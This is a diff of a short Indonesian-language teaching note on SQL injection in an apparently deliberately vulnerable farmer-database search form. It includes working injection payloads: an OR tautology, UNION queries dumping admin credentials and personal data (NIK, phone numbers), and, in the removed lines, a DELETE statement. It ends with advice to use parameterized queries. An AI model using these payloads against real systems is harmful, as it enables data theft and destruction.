@@ -1,16 +1,34 @@
-## Skenario Injeksi SQL pada FormPadi
+## Skenario SQL Injection
 
-1. **Tampilkan semua data**  
-   Masukkan: `' OR '1'='1`  
-   Query jadi: `SELECT * FROM vw_Padi WHERE namaPetani LIKE '%' OR '1'='1%'`
+### Form: FormPetani → Tombol "Test Injection"
+### Method rentan: SearchRentan() di PetaniDAL
 
-2. **Ambil data admin (Union)**  
-   Masukkan: `' UNION SELECT idAdmin, username, password, null, null FROM Admin --`
+Query rentan:
+SELECT idPetani, namaPetani, NIK, alamat, noTelepon 
+FROM petani 
+WHERE namaPetani = '[INPUT_USER]'
 
-3. **Hapus semua data (jika multi-statement aktif)**  
-   Masukkan: `'; DELETE FROM Padi; --`
+---
 
-> Penyebab: parameter `txtCari.Text` digabung langsung ke query SQL tanpa parameterized query.
+### Skenario 1 — Tampilkan semua data
+Input: ' OR '1'='1' --
+Query jadi:
+WHERE namaPetani = '' OR '1'='1' --'
+Hasil: Semua data petani bocor
+
+---
+
+### Skenario 2 — UNION Attack
+Input: ' UNION SELECT idPetani, namaPetani, NIK, alamat, noTelepon FROM petani --
+Query jadi:
+WHERE namaPetani = '' UNION SELECT idPetani, namaPetani, NIK, alamat, noTelepon FROM petani --
+Hasil: Data terduplikasi / data sensitif bocor
+
+---
+
+### Pencegahan:
+Gunakan Stored Procedure / parameterized query
+seperti di method Search() → sp_SearchPetani
 
 
 
